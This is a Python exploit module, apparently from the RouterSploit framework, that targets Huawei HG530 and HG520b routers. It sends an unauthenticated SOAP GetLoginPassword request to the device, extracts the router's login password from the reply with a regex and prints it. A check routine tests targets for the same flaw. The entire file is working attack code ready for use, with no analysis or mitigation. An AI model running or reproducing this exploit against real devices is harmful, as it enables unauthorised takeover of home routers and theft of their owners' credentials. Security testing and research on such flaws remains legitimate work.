# title: Huawei HG530 & HG520b Password Disclosure
# rsf exploit module
# description: Module exploits password disclosure vulnerability in Huawei HG530 and HG520b devices.

import re
import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80

    def http_request(self, method, path, **kwargs):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            if method == "GET":
                return requests.get(url, **kwargs)
            elif method == "POST":
                return requests.post(url, **kwargs)
        except:
            return None

    def run(self):
        headers = {
            'SOAPACTION': '"urn:dslforum-org:service:UserInterface:1#GetLoginPassword"',
            'Content-Type': 'text/xml; charset="utf-8"',
            'Expect': '100-continue'
        }
        data = ("<?xml version=\"1.0\"?>"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                "<s:Body>"
                "<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
                "</m:GetLoginPassword>"
                "</s:Body>"
                "</s:Envelope>")

        response = self.http_request(
            method="POST",
            path="/UD/?5",
            headers=headers,
            data=data
        )
        if response is None:
            print("[-] Connection failed")
            return

        r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
        m = r.search(response.text)

        if m:
            print("[+] Password has been found")
            print(f"[*] Password: {m.group(1)}")
        else:
            print("[-] Exploit failed - could not find password")

    def check(self):
        headers = {'SOAPACTION': '"urn:dslforum-org:service:UserInterface:1#GetLoginPassword"',
                   'Content-Type': 'text/xml; charset="utf-8"',
                   'Expect': '100-continue'}
        data = ("<?xml version=\"1.0\"?>"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                "<s:Body>"
                "<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
                "</m:GetLoginPassword>"
                "</s:Body>"
                "</s:Envelope>")

        response = self.http_request(
            method="POST",
            path="/UD/?5",
            headers=headers,
            data=data
        )
        if response is None:
            return False

        r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
        m = r.search(response.text)

        return bool(m)
